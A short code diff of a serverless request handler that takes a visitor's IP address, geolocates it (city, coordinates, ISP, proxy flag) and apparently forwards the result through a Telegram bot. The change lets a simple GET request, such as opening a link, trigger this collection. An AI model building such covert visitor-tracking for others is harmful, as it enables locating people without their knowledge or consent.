@@ -1,11 +1,11 @@
 export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).end();
+  if (req.method !== 'POST' && req.method !== 'GET') return res.status(405).end();
 
   const BOT_TOKEN  = process.env.TELEGRAM_BOT_TOKEN;
   const CHAT_ID    = process.env.TELEGRAM_CHAT_ID;
 
   try {
-    const body = await req.json().catch(() => ({}));
+    const body = req.method === 'POST' ? await req.json().catch(() => ({})) : {};
 
     // ── Get IP ──────────────────────────────────────────
     const ip =
@@ -35,8 +35,8 @@ export default async function handler(req, res) {
       const gj  = await geo.json();
       if (gj.city)    city    = gj.city;
       if (gj.country) country = gj.country;
-      if (gj.lat)     lat     = gj.lat;
-      if (gj.lon)     lon     = gj.lon;
+      if (!lat && gj.lat) lat = gj.lat;
+      if (!lon && gj.lon) lon = gj.lon;
       location = `${gj.city || '?'}, ${gj.regionName || '?'}, ${gj.country || '?'}`;
       isp      = gj.isp || gj.org || 'Unknown';
       const isProxy   = gj.proxy   ? 40 : 0;
